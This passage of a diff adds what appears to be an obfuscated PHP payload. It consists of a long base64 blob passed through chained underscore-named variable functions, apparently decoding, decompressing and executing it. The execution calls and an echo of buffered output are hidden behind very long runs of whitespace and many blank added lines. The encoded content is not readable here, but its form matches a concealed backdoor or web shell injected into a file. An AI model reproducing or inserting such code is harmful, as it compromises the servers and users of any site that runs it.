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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
